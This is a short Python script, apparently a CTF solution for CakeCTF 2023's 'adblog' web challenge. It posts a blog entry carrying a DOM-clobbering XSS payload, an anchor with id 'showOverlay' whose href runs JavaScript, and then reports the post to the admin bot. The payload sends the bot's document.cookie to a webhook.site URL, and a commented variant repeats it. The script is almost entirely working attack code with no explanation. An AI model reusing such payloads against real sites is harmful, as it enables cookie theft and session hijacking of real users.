import requests

service_url = 'http://adblog.2023.cakectf.com:8001/'
report_url= 'http://adblog.2023.cakectf.com:8002/'
data = {'title':'aaa','content':'<a id=showOverlay href="cid:function xss() {document.location=`https://webhook.site/455fcac5-9c2c-4a81-990c-445705038802/?flag=${document.cookie}`}xss()"></a>'}
res = requests.post(service_url,data=data)
blog_id = res.url.split('/')[-1]
session = requests.Session()
res = session.get(report_url)
url = {'url':blog_id}
print(url)
res = session.post(report_url,json=url)
print(res.text)
#<a id=showOverlay href="function xss(){document.location=`https://webhook.site/455fcac5-9c2c-4a81-990c-445705038802/?c=${document.cookie}`}xss()"></a>